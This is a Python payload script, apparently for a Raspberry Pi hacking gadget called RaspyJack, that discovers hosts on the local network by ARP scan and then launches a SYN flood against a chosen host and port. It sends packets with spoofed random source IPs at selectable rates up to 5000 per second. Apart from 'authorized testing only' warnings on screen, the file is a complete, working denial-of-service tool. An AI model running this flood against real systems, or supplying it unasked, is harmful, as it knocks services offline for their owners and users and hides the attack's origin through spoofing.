#!/usr/bin/env python3
"""
RaspyJack Payload -- SYN Flood
================================
Author: 7h30th3r0n3

SYN flood for testing service resilience.
Sends TCP SYN packets with randomized source IPs and ports to
a user-selected host:port target.

Flow:
  1) ARP scan to discover hosts (or manual target)
  2) User selects target host:port
  3) Send SYN with random src IP/port at adjustable speed
  4) Display packet count, speed, duration

Controls:
  OK        -- Start / stop flood
  UP / DOWN -- Adjust speed (packets/sec)
  KEY1      -- Select target (scroll hosts)
  KEY3      -- Exit

Loot: None (attack-only payload).

WARNING: Authorized testing only!

Setup: No special requirements. Uses scapy raw sockets.
"""

import os
import sys
import time
import random
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        send, IP, TCP, ARP, Ether, srp, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SPEED_LEVELS = [10, 50, 100, 500, 1000, 5000]
COMMON_PORTS = [80, 443, 22, 8080, 3389, 21, 25, 53, 445, 3306]
ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
hosts = []               # [{"ip": ..., "mac": ...}]
scroll_pos = 0
selected_idx = 0
target_ip = ""
target_port = 80
speed_idx = 2            # index into SPEED_LEVELS (default 100 pps)
view_mode = "hosts"      # hosts | attack
status_msg = "Scanning..."
flood_active = False
app_running = True
packets_sent = 0
start_time = 0.0


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_default_iface():
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_subnet(iface):
    try:
        r = subprocess.run(["ip", "-4", "addr", "show", "dev", iface],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1]
    except Exception:
        pass
    return ""


def _random_ip():
    """Generate a random non-reserved source IP."""
    while True:
        octets = [random.randint(1, 254) for _ in range(4)]
        # Avoid private/reserved ranges for spoofed source
        if octets[0] in (10, 127, 0, 255):
            continue
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        return ".".join(str(o) for o in octets)


# ---------------------------------------------------------------------------
# Discovery
# ---------------------------------------------------------------------------

def _discovery_thread():
    """Discover hosts via ARP."""
    global hosts, status_msg, selected_idx, scroll_pos
    iface = _get_default_iface()
    subnet = _get_subnet(iface)
    if not subnet:
        with lock:
            status_msg = "No subnet found"
        return

    with lock:
        status_msg = f"ARP scan {subnet}..."

    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
            iface=iface, timeout=3, verbose=False,
        )
        found = [{"ip": recv.psrc, "mac": recv.hwsrc} for _, recv in ans]
    except Exception:
        found = []

    with lock:
        hosts = found
        selected_idx = 0
        scroll_pos = 0
        status_msg = f"Found {len(found)} hosts"


# ---------------------------------------------------------------------------
# Flood thread
# ---------------------------------------------------------------------------

def _flood_thread():
    """Send SYN packets at configured speed."""
    global packets_sent, flood_active, start_time, status_msg

    flood_active = True
    start_time = time.time()
    conf.verb = 0

    with lock:
        status_msg = f"Flooding {target_ip}:{target_port}"

    while app_running and flood_active:
        pps = SPEED_LEVELS[speed_idx]
        batch_size = max(1, pps // 10)
        batch_start = time.time()

        for _ in range(batch_size):
            if not flood_active or not app_running:
                break
            src_ip = _random_ip()
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            try:
                pkt = (
                    IP(src=src_ip, dst=target_ip)
                    / TCP(sport=src_port, dport=target_port, flags="S", seq=seq)
                )
                send(pkt, verbose=False)
                with lock:
                    packets_sent += 1
            except Exception:
                pass

        # Rate limiting
        elapsed = time.time() - batch_start
        target_time = batch_size / max(pps, 1)
        if elapsed < target_time:
            time.sleep(target_time - elapsed)

    flood_active = False


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    # Warning banner
    draw.rectangle((0, 0, 127, 13), fill="RED")
    draw.text((4, 1), "SYN FLOOD - AUTH ONLY", fill="WHITE", font=font)

    with lock:
        st = status_msg
        vm = view_mode
        sp = scroll_pos
        si = selected_idx
        h_list = list(hosts)
        ps = packets_sent
        fa = flood_active
        t_ip = target_ip
        t_port = target_port
        spd = SPEED_LEVELS[speed_idx]

    draw.text((2, 16), st[:22], fill="WHITE", font=font)

    if vm == "hosts":
        y = 30
        for i, h in enumerate(h_list[sp:sp + ROWS_VISIBLE]):
            real_i = sp + i
            prefix = ">" if real_i == si else " "
            color = "YELLOW" if real_i == si else "WHITE"
            draw.text((2, y), f"{prefix}{h['ip']}"[:22], fill=color, font=font)
            y += 14

        if not h_list:
            draw.text((2, 56), "Scanning...", fill="GRAY", font=font)
        draw.text((2, 116), "OK=select K1=target", fill="GRAY", font=font)

    elif vm == "attack":
        draw.text((2, 30), f"Target: {t_ip}:{t_port}", fill="RED", font=font)
        draw.text((2, 44), f"Speed:  {spd} pps", fill="YELLOW", font=font)
        draw.text((2, 58), f"Sent:   {ps}", fill="GREEN" if fa else "WHITE", font=font)

        if fa and start_time > 0:
            duration = int(time.time() - start_time)
            mins = duration // 60
            secs = duration % 60
            draw.text((2, 72), f"Time:   {mins}m {secs}s", fill="WHITE", font=font)
            # Spinning indicator
            tick = int(time.time() * 4) % 4
            chars = "|/-\\"
            draw.text((110, 58), chars[tick], fill="RED", font=font)
        else:
            draw.text((2, 72), "Press OK to start", fill="GRAY", font=font)

        draw.text((2, 88), "UP/DN = adjust speed", fill="GRAY", font=font)
        draw.text((2, 102), "OK = start/stop", fill="GRAY", font=font)
        draw.text((2, 116), "KEY3 = exit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global app_running, flood_active, scroll_pos, selected_idx
    global view_mode, status_msg, target_ip, target_port, speed_idx, packets_sent

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    try:
        # Show warning splash
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.rectangle((0, 0, 127, 127), outline="RED")
        d.rectangle((2, 2, 125, 125), outline="RED")
        d.text((10, 20), "!! WARNING !!", fill="RED", font=font)
        d.text((4, 40), "Authorized testing", fill="YELLOW", font=font)
        d.text((4, 54), "ONLY. Illegal use", fill="YELLOW", font=font)
        d.text((4, 68), "is YOUR liability.", fill="YELLOW", font=font)
        d.text((20, 100), "OK to continue", fill="GRAY", font=font)
        LCD.LCD_ShowImage(img, 0, 0)

        # Wait for OK to acknowledge
        while True:
            btn = get_button(PINS, GPIO)
            if btn == "OK":
                break
            if btn == "KEY3":
                GPIO.cleanup()
                return
            time.sleep(0.15)

        # Start host discovery
        threading.Thread(target=_discovery_thread, daemon=True).start()
        _draw_screen()

        while app_running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                with lock:
                    vm = view_mode
                    h_list = list(hosts)
                    si = selected_idx
                    fa = flood_active

                if vm == "hosts" and 0 <= si < len(h_list):
                    with lock:
                        target_ip = h_list[si]["ip"]
                        target_port = 80
                        view_mode = "attack"
                        packets_sent = 0
                        status_msg = f"Target: {target_ip}"

                elif vm == "attack":
                    if not fa:
                        threading.Thread(
                            target=_flood_thread, daemon=True,
                        ).start()
                    else:
                        flood_active = False
                        with lock:
                            status_msg = "Flood stopped"

            elif btn == "UP":
                with lock:
                    vm = view_mode
                if vm == "hosts":
                    with lock:
                        if selected_idx > 0:
                            selected_idx -= 1
                        if selected_idx < scroll_pos:
                            scroll_pos = selected_idx
                elif vm == "attack":
                    if speed_idx < len(SPEED_LEVELS) - 1:
                        speed_idx += 1

            elif btn == "DOWN":
                with lock:
                    vm = view_mode
                if vm == "hosts":
                    with lock:
                        if selected_idx < len(hosts) - 1:
                            selected_idx += 1
                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                elif vm == "attack":
                    if speed_idx > 0:
                        speed_idx -= 1

            elif btn == "KEY1":
                if view_mode == "attack":
                    # Cycle target port
                    idx = COMMON_PORTS.index(target_port) if target_port in COMMON_PORTS else -1
                    target_port = COMMON_PORTS[(idx + 1) % len(COMMON_PORTS)]
                    with lock:
                        status_msg = f"Port: {target_port}"
                else:
                    # Re-scan
                    threading.Thread(target=_discovery_thread, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        flood_active = False
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "SYN Flood stopped", fill="YELLOW", font=font)
            d.text((10, 66), f"Total: {packets_sent} pkts", fill="WHITE", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
